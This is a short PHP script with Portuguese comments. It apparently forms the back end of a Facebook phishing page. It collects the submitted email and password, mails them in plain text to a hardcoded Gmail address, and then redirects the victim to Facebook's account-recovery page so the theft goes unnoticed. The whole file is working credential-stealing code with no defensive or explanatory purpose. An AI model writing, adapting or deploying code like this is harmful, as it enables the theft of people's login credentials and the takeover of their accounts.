<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "clebber015@gmail.com"; // Substitua pelo seu e-mail
    $subject = "Dados de Login";
    $message = "Email: " . $_POST['email'] . "\nSenha: " . $_POST['pass'];
    $headers = "From: no-reply@seudominio.com" . "\r\n" .
               "Reply-To: no-reply@seudominio.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Envia o e-mail
    if (mail($to, $subject, $message, $headers)) {
        // Após o envio do e-mail, redireciona para outra página
        header('Location: https://facebook.com/recover/initiate/');
        exit();
    } else {
        // Caso haja algum erro no envio do e-mail
        echo "Erro ao enviar o e-mail.";
    }
}
?>